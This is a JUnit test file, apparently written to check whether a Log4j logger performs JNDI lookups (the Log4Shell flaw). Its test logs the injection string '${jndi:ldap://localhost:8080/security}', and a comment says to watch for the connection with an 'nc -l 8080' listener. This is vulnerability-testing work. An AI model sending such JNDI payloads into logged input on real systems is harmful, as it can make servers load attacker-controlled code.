package log4jsecurity;


import static org.junit.Assert.assertNotNull;

import java.lang.reflect.Field;
import java.util.Map;

import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.appender.AbstractManager;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.Configurator;
import org.apache.logging.log4j.core.lookup.Interpolator;
import org.apache.logging.log4j.core.lookup.StrLookup;
import org.apache.logging.log4j.core.lookup.StrSubstitutor;
import org.apache.logging.log4j.core.net.JndiManager;

import org.junit.Assert;
import org.junit.Before;
import org.junit.Test;



/**
 * When you run this test, start a dummy server using nc -l 8080
 * This test while logging connects to the server .. 
 * 
 * @author shiva
 *
 */
public class TestVulnerability {
	
	Logger logger;
	
	@Before
	public void setUp() throws Exception {
		Configurator.setAllLevels(LogManager.getRootLogger().getName(), Level.INFO);
		
		logger = LogManager.getLogger(TestVulnerability.class);
		
	}
	
	
	@Test
	public void vulnerability() {
		String name = "shiva";
		
		// Make sure we have the log4j logger 
		Assert.assertTrue(logger.getClass().getName().contains("log4j.core"));
		
		// Make sure info logging is enabled
		Assert.assertTrue(logger.isInfoEnabled());
		
		// Try  to log the JNDI string 
		logger.info("${jndi:ldap://localhost:8080/security}");
		//logger.info("Hi ${java:hw}");
		//logger.info("Hi ${lower:ShivaJayaraman}");
		//logger.info("HI ${java:name}");
	}
	
	/*
	public static class DummyJndiManager extends JndiManager {
		public DummyJndiManager(String name )
	}
	*/
}
